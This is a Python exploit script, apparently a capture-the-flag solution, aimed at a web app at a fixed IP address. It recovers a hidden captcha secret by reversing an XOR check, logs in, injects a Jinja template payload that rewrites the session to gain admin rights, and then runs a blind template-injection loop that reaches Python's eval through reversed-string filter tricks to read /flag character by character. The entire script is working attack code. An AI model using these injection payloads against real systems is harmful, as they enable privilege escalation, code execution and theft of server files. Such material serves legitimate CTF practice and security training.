import requests
import string

session = requests.Session()
url = 'http://34.124.157.127:5000'
flag = ''

def gen_captcha():
	SECRET = '[CENSORED]' # this is captcha
	CHECK = '203c0617e3bde7ec99b5b657417a75131e3629b8ffdfdbbbbfd02332'
	head = b'hello '
	array_check = list(bytes.fromhex(CHECK))
	ord_a = array_check[0] ^ head[0]
	ord_b = (array_check[1] ^ head[1]) - ord_a
	head_secret = '' 

	for r in array_check:
		head_secret += chr(ord_a ^ r)
		ord_a = (ord_a + ord_b) % 256
	if head.decode('utf-8') in head_secret:
		SECRET = head_secret.replace(head.decode('utf-8'), '')
	return SECRET

def login():
	body = {'username':'a','password':'a','secret':'a', 'captcha':gen_captcha()}
	res = session.post(url+'/login', data=body)
	# print(res.text)

def admin_escalate():
	body = {'picture': """{%set a=session.update({'username':'admin','check':1})%}"""}
	res = session.post(url+'/rate', data=body)
	# print(res.text)

def blind_flag():
	global flag
	for i in range(1,300):
		login()
		admin_escalate()
		for c in string.ascii_letters + '{_!}':
			print(c,end="\r")
			data = {'picture':""""{% set g='__slabolg__'|reverse%}{% set b='__snitliub__'|reverse%}{% set p=t.__init__[g][b]['eval']%}{<{p(' s if str([i for i in open("/flag")])[s]=="char" else a',{'s':"index"|length})}>}""".replace('index','a'*i).replace('char', c)} # index is replaced by 'a'*i, the more i the more 'a'.
			# print(data)
			r = session.post(url+'/rate',data=data)
			# print(r.text)
			# print(r.status_code)
			if r.status_code != 500:
				flag += c
				print(flag)
				break
